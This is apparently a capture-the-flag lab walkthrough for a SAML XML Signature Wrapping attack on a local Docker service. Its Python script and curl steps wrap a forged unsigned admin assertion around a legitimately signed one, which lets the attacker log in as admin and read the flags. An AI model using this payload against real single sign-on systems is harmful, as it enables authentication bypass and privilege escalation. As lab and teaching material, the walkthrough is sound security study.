# Walkthrough: SAML XSW Attack

## Setup

```bash
docker compose up --build -d
```

## Step 1: Get a Valid Signed Response

```bash
curl -s http://127.0.0.1:8093/debug/idp | python3 -c "
import json, sys
d = json.load(sys.stdin)
print('blob:', d['saml_response'][:60], '...')
print('xml:', d['decoded'][:200])
"
```

Save the `saml_response` value for the next step.

## Step 2: Confirm the Legitimate Flow Works

```bash
CJAR=$(mktemp)
BLOB="<alice_blob_from_step_1>"
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8093/sso/acs \
    -H "Content-Type: application/json" \
    -d "{\"SAMLResponse\":\"$BLOB\"}"
# Output: {"message":"SSO login as alice","role":"user"}

curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8093/profile
# Output: {"hint":null,"role":"user","user":"alice"}
```

## Step 3: Understand the XML Structure

Decode the blob and examine the assertion:

```bash
echo "$BLOB" | python3 -c "import base64, sys; print(base64.b64decode(sys.stdin.read()).decode())"
```

The signed assertion has:
- `ID` attribute (e.g., `ID="a7f3c..."`)
- `<saml:AttributeValue>user</saml:AttributeValue>`
- `<ds:Signature>...<ds:SignatureValue>long_hex_value</ds:SignatureValue></ds:Signature>`

## Step 4: Build the XSW Payload

```python
import base64, re

# Paste the blob here
alice_b64 = "..."
xml = base64.b64decode(alice_b64).decode()

# Extract the signed assertion
signed = re.search(r'(<saml:Assertion.*?</saml:Assertion>)', xml, re.DOTALL).group(1)

# Build an unsigned admin assertion with a different ID
unsigned_admin = (
    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="xsw_inject">'
    '<saml:NameID>attacker</saml:NameID>'
    '<saml:AttributeStatement>'
    '<saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>'
    '</saml:AttributeStatement>'
    '</saml:Assertion>'
)

# Wrap: unsigned admin first, signed alice second
wrapped = (
    '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
    + unsigned_admin + signed + '</samlp:Response>'
)
print(base64.b64encode(wrapped.encode()).decode())
```

## Step 5: Post the Wrapped Payload

```bash
rm -f "$CJAR"; CJAR=$(mktemp)
XSW_BLOB="<output from step 4>"
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8093/sso/acs \
    -H "Content-Type: application/json" \
    -d "{\"SAMLResponse\":\"$XSW_BLOB\"}"
# Output: {"message":"SSO login as attacker","role":"admin"}
```

The signature passed (the signed alice assertion is still there). The SP read admin role from the unsigned injection.

## Step 6: Get the Flags

```bash
curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8093/profile
# flag1 in hint

curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8093/admin/secret
# flag2 in secret
```

## Teardown

```bash
docker compose down
```
